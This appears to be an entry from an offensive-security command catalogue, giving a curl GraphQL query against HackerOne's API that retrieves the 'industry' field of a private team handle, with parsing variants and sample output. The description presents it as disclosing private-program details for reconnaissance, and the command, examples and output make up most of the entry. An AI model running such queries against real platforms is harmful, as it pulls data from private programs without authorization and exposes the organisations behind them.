---
id: 123e4567-e89b-12d3-a456-426614174003
name: graphql-query-team-industry-private2
type: command
executor: bash
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"example-private-team2\"){_id,industry}}"}'
output: '{"data":{"team":{"_id":"example-id2","industry":"Computer Software"}}}'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.944Z'
platforms:
  - Web
tags:
  - graphql
  - api
  - reconnaissance
verified: false
validated: true
submitted: true
---

# graphql-query-team-industry-private2

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team2\"){_id,industry}}"}'
```

## Description

Similar to the first private query, this command targets a different private team handle to retrieve and disclose the 'industry' field, aiding in broader reconnaissance of private programs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `https://api.hackerone.com/graphql` | API endpoint | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |
| `-d '{...}'` | Query payload | Yes |
| `handle: \"example-private-team2\"` | Second private team handle | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team2\"){_id,industry}}"}'
```

### Advanced Usage

With JSON parsing:

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team2\"){_id,industry}}"}' | jq '.data.team.industry'
```

## Expected Output

{"data":{"team":{"_id":"example-id2","industry":"Computer Software"}}}.

## Related

- [[commands/graphql-query-team-industry-private1]]
- [[procedures/Query-HackerOne-GraphQL-Team-Industry]]
